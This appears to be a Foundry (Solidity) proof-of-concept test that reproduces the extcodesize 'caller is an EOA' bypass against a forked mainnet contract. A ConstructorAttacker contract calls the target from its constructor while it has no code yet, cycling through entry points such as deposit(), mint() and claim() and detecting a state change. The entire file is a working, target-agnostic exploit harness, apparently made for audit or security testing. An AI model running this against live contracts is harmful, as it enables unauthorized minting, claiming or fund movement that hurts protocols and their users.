// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- extcodesize identity bypass (constructor call)
/// @notice Detector: extcodesize. The target uses extcodesize(msg.sender)
///         == 0 to "prove" the caller is an EOA and block contracts. During
///         a contract's CONSTRUCTOR its code is not deployed yet, so
///         extcodesize == 0 -- a contract calling from its constructor
///         passes the EOA check.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh.
///
///      This harness does NOT guess a single entry point. It tries every
///      plausible gated entry point, each called FROM A CONSTRUCTOR (where
///      extcodesize == 0), and accepts the first that produces the class
///      OBSERVABLE -- a CONTRACT passes the gate and state MOVES. A call
///      that merely RETURNS is never treated as a reproduction.

/// Calls the target FROM ITS CONSTRUCTOR, when it has no code yet --
/// extcodesize(address(this)) == 0, so any EOA gate passes.
contract ConstructorAttacker {
    bool public lastOk;

    constructor(address victim, bytes memory data) {
        (lastOk,) = victim.call(data);
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// A generic state fingerprint: the target's balance plus its first 8
    /// storage slots. Any state move the gated call causes changes this.
    function _fingerprint() internal view returns (uint256) {
        bytes memory acc = abi.encode(target.balance);
        for (uint256 i = 0; i < 8; i++) {
            acc = abi.encodePacked(acc, vm.load(target, bytes32(i)));
        }
        return uint256(keccak256(acc));
    }

    /// Try ONE candidate, issued from a contract's CONSTRUCTOR, and accept it
    /// only when the class OBSERVABLE changes -- never because it returned.
    /// `before` is a state fingerprint snapshot. `attacker` is unused for the
    /// caller identity (the caller is the freshly-deployed contract) but kept
    /// so the signature matches the shared pattern.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        attacker; // caller identity comes from ConstructorAttacker's address
        ConstructorAttacker a = new ConstructorAttacker(target, data);
        bool ok = a.lastOk();
        console.log("tried", label, ok ? "call returned" : "call reverted");
        // OBSERVABLE (extcodesize bypass): a CONTRACT passed the gate AND the
        // target's state MOVED. A call that merely returned without moving
        // state proves nothing.
        if (ok && _fingerprint() != before) return label;
        return "";
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        used = _attempt(
            attacker,
            before,
            "isContract(address)",
            abi.encodeWithSignature("isContract(address)", address(this))
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker, before, "check(address)", abi.encodeWithSignature("check(address)", address(this))
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "deposit()", abi.encodeWithSignature("deposit()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "mint()", abi.encodeWithSignature("mint()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "claim()", abi.encodeWithSignature("claim()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "stake()", abi.encodeWithSignature("stake()"));
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        // OBSERVABLE snapshot: the target's state fingerprint.
        uint256 before = _fingerprint();

        string memory used = _tryEntry(attackerEOA, before);

        assertTrue(
            bytes(used).length > 0,
            "not reproduced via any tried entry point. Candidates tried: isContract(address), check(address), deposit(), mint(), claim(), stake() -- each was called from a contract's constructor but either REVERTED (gate held) or RETURNED without moving state. This does NOT establish safety: the gated function may be under another name. Adapt the candidate list."
        );
        console.log("extcodesize bypass reproduced via", used, "-- a contract passed the EOA gate");
    }
}
